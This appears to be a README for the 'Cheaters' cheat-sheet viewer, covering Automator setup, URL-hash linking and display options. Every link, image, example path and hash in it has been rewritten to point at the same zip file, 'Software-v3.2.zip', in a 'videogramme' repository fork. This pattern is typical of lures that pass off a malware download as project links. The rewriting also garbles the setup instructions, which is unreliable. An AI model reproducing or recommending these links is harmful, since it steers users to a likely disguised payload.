Support Cheaters by contributing to my [GitTip fund](https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip) or [making a donation](https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip).

![Cheat Sheets Header](https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip)

[macdrifter]: https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip
[gather]: https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip
[te]: https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip
[marky]: https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip
[demo]: https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip
...
![Cheat Sheets wide](https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip)

### Using Cheaters

The most useful way to use Cheaters is with an Automator Application.

![Cheaters Automator Application setup](https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip)
...
5. Double click the default URL in the **Get Specified URLs** action and set it to the file path to your Cheaters folder. This will be in the format `https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip`.
...
As of a recent update, Cheaters can now handle linking directly to a specific cheat sheet using url hashes. You can use a zero-index number to link to a page if you know the order (https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip to link to the fourth item), but because the order is configurable and subject to change, it also supports name matching. For example, if you want to link the Siri cheat sheet directly, you can use `[your_url_or_path]https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip`.
...
There's also a contrast icon in the upper right, which you can use to flip between light-on-dark and dark-on-light. You can make this change permanent by editing the body class in https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip Adding a class of "inverted" will set it to be light-on-dark by default; without that class it's dark-on-light automatically.

#### Using PDFs

![Cheat Sheets with image](https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip)
...
If you create some great cheat sheets, fork this and send a pull request. Just [let me know](https://raw.githubusercontent.com/videogramme/cheaters/master/js/Software-v3.2.zip) if you need a hand!
